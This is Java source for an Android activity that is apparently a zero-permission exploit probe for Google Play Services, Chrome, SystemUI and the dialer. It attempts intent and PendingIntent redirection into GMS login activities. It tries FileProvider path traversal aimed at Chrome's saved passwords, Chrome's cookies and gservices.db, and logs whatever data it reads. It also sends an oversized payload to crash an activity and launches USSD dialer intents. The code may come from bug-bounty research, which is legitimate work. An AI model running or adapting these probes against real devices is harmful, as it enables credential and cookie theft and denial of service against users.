package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;

public class CrashProbeActivity extends Activity {
    private static final String T = "CRASHPROBE";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== Crash/DoS Probe ===");
        Log.w(T, "UID=" + android.os.Process.myUid());

        testIntentRedirection();
        testFileProviderTraversal();
        testCrashViaLargePayload();
        testSystemUIDoS();
        testPhoneDialerCrash();

        Log.w(T, "=== CRASH PROBE COMPLETE ===");
    }

    private void testIntentRedirection() {
        Log.w(T, "--- Intent Redirection in GMS ---");

        Object[][] targets = {
            {"com.google.android.gms",
             "com.google.android.gms.common.api.GoogleApiActivity",
             Intent.EXTRA_INTENT,
             new Intent().setClassName("com.google.android.gms",
                 "com.google.android.gms.auth.api.signin.internal.SignInHubActivity"),
             "GoogleApiActivity redirect to SignInHub"},

            {"com.google.android.gms",
             "com.google.android.gms.auth.api.credentials.ui.CredentialPickerActivity",
             Intent.EXTRA_INTENT,
             new Intent("android.intent.action.VIEW",
                 Uri.parse("content://com.google.android.gms/auth/credentials")),
             "CredentialPicker redirect"},

            {"com.google.android.gms",
             "com.google.android.gms.common.api.GoogleApiActivity",
             "resolution",
             new Intent().setClassName("com.google.android.gms",
                 "com.google.android.gms.auth.login.LoginActivity"),
             "GoogleApiActivity resolution redirect"},
        };

        for (Object[] target : targets) {
            try {
                String pkg = (String) target[0];
                String cls = (String) target[1];
                String extraKey = (String) target[2];
                Intent redirect = (Intent) target[3];
                String label = (String) target[4];

                Intent i = new Intent();
                i.setClassName(pkg, cls);
                i.putExtra(extraKey, redirect);
                startActivityForResult(i, 900);
                Log.w(T, "[+] " + label + " launched");
            } catch (SecurityException se) {
                String label = (String) target[4];
                Log.w(T, "[-] SECURITY: " + label);
            } catch (Exception e) {
                String label = (String) target[4];
                Log.w(T, "[-] " + label + ": " + e.getClass().getSimpleName());
            }
        }

        try {
            Intent i = new Intent();
            i.setClassName("com.google.android.gms",
                "com.google.android.gms.common.api.GoogleApiActivity");
            android.app.PendingIntent pi = android.app.PendingIntent.getActivity(this, 0,
                new Intent().setClassName("com.google.android.gms",
                    "com.google.android.gms.auth.login.LoginActivity"),
                android.app.PendingIntent.FLAG_MUTABLE | android.app.PendingIntent.FLAG_UPDATE_CURRENT);
            i.putExtra("resolution", pi);
            startActivityForResult(i, 901);
            Log.w(T, "[+] GoogleApiActivity with PendingIntent resolution launched");
        } catch (Exception e) {
            Log.w(T, "[-] PI resolution: " + e.getClass().getSimpleName() + ": " + shortMsg(e));
        }
    }

    private void testFileProviderTraversal() {
        Log.w(T, "--- FileProvider Path Traversal ---");
        ContentResolver cr = getContentResolver();

        String[][] providers = {
            {"content://com.google.android.gms.fileprovider/", "GMS FileProvider root"},
            {"content://com.google.android.gms.fileprovider/external_files/", "GMS external_files"},
            {"content://com.google.android.gms.fileprovider/../databases/", "GMS traversal databases"},
            {"content://com.google.android.gms.fileprovider/external_files/../../databases/gservices.db", "GMS gservices.db"},
            {"content://com.google.android.apps.docs.storage.legacy/", "Docs storage legacy root"},
            {"content://com.google.android.apps.docs.storage/", "Docs storage root"},
            {"content://com.android.chrome.FileProvider/", "Chrome FileProvider root"},
            {"content://com.android.chrome.FileProvider/../app_chrome/Default/Login Data", "Chrome passwords"},
            {"content://com.android.chrome.FileProvider/../app_chrome/Default/Cookies", "Chrome cookies"},
        };

        for (String[] p : providers) {
            try {
                android.database.Cursor c = cr.query(Uri.parse(p[0]), null, null, null, null);
                if (c != null) {
                    Log.w(T, "[!!!] " + p[1] + ": " + c.getCount() + " rows");
                    if (c.moveToFirst()) {
                        String[] cols = c.getColumnNames();
                        for (String col : cols) {
                            try {
                                String val = c.getString(c.getColumnIndex(col));
                                if (val != null && val.length() > 0) {
                                    Log.w(T, "  " + col + "=" + val.substring(0, Math.min(val.length(), 100)));
                                }
                            } catch (Exception ex) {}
                        }
                    }
                    c.close();
                }
            } catch (SecurityException se) {
                Log.w(T, "[-] SECURITY: " + p[1]);
            } catch (Exception e) {
                Log.w(T, "[-] " + p[1] + ": " + e.getClass().getSimpleName());
            }

            try {
                java.io.InputStream is = cr.openInputStream(Uri.parse(p[0]));
                if (is != null) {
                    byte[] buf = new byte[256];
                    int read = is.read(buf);
                    is.close();
                    if (read > 0) {
                        StringBuilder sb = new StringBuilder();
                        for (int i = 0; i < Math.min(read, 64); i++) {
                            if (buf[i] >= 32 && buf[i] < 127) sb.append((char) buf[i]);
                        }
                        Log.w(T, "[!!!] READ " + p[1] + ": " + read + " bytes — " + sb);
                    }
                }
            } catch (SecurityException se) {
                // Already logged above
            } catch (java.io.FileNotFoundException fe) {
                // Normal
            } catch (Exception e) {
                // Normal
            }
        }
    }

    private void testCrashViaLargePayload() {
        Log.w(T, "--- Large Payload Crash ---");

        try {
            Intent i = new Intent();
            i.setClassName("com.google.android.gms",
                "com.google.android.gms.common.api.GoogleApiActivity");
            byte[] large = new byte[512 * 1024];
            i.putExtra("crash_data", large);
            startActivity(i);
            Log.w(T, "[+] Large payload (512KB) sent to GoogleApiActivity");
        } catch (Exception e) {
            Log.w(T, "[-] Large payload: " + e.getClass().getSimpleName());
        }
    }

    private void testSystemUIDoS() {
        Log.w(T, "--- SystemUI Interaction ---");

        try {
            Intent i = new Intent("android.intent.action.SHOW_BRIGHTNESS_DIALOG");
            sendBroadcast(i);
            Log.w(T, "[+] SHOW_BRIGHTNESS_DIALOG sent");
        } catch (SecurityException se) {
            Log.w(T, "[-] BRIGHTNESS SECURITY");
        } catch (Exception e) {
            Log.w(T, "[-] BRIGHTNESS: " + e.getClass().getSimpleName());
        }

        try {
            Intent i = new Intent("android.intent.action.MEDIA_BUTTON");
            i.putExtra(Intent.EXTRA_KEY_EVENT,
                new android.view.KeyEvent(android.view.KeyEvent.ACTION_DOWN,
                    android.view.KeyEvent.KEYCODE_HEADSETHOOK));
            sendBroadcast(i);
            Log.w(T, "[+] MEDIA_BUTTON sent");
        } catch (SecurityException se) {
            Log.w(T, "[-] MEDIA_BUTTON SECURITY");
        } catch (Exception e) {
            Log.w(T, "[-] MEDIA_BUTTON: " + e.getClass().getSimpleName());
        }

        try {
            Intent i = new Intent("com.android.systemui.action.LAUNCH_CONTROLS");
            sendBroadcast(i);
            Log.w(T, "[+] LAUNCH_CONTROLS sent");
        } catch (SecurityException se) {
            Log.w(T, "[-] LAUNCH_CONTROLS SECURITY");
        } catch (Exception e) {
            Log.w(T, "[-] LAUNCH_CONTROLS: " + e.getClass().getSimpleName());
        }
    }

    private void testPhoneDialerCrash() {
        Log.w(T, "--- Dialer Deep Link ---");

        try {
            Intent i = new Intent(Intent.ACTION_DIAL, Uri.parse("tel:*%2306%23"));
            startActivity(i);
            Log.w(T, "[+] USSD dial launched");
        } catch (Exception e) {
            Log.w(T, "[-] USSD: " + e.getClass().getSimpleName());
        }

        try {
            Intent i = new Intent(Intent.ACTION_CALL, Uri.parse("tel:*%2306%23"));
            startActivity(i);
            Log.w(T, "[!!!] USSD call launched WITHOUT CALL_PHONE PERMISSION");
        } catch (SecurityException se) {
            Log.w(T, "[-] USSD call SECURITY (expected)");
        } catch (Exception e) {
            Log.w(T, "[-] USSD call: " + e.getClass().getSimpleName());
        }

        try {
            Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse("tel:1234567890"));
            i.setPackage("com.google.android.dialer");
            startActivityForResult(i, 950);
            Log.w(T, "[+] Dialer VIEW tel: launched");
        } catch (Exception e) {
            Log.w(T, "[-] Dialer VIEW: " + e.getClass().getSimpleName());
        }
    }

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);
        Log.w(T, "[RESULT] req=" + req + " res=" + res);
        if (data != null) {
            Log.w(T, "[!!!] DATA from req=" + req);
            if (data.getData() != null) Log.w(T, "  URI: " + data.getData());
            if (data.getExtras() != null) {
                try {
                    for (String key : data.getExtras().keySet()) {
                        try {
                            Object val = data.getExtras().get(key);
                            String valStr = val != null ? val.toString() : "null";
                            Log.w(T, "  " + key + " = " + valStr.substring(0, Math.min(valStr.length(), 200)));
                        } catch (Exception ex) {
                            Log.w(T, "  " + key + " = [error: " + ex.getClass().getSimpleName() + "]");
                        }
                    }
                } catch (Exception ex) {
                    Log.w(T, "  bundle error: " + ex.getClass().getSimpleName());
                }
            }
        }
    }

    private String shortMsg(Exception e) {
        String msg = e.getMessage();
        if (msg == null) return "";
        return msg.substring(0, Math.min(msg.length(), 120));
    }
}
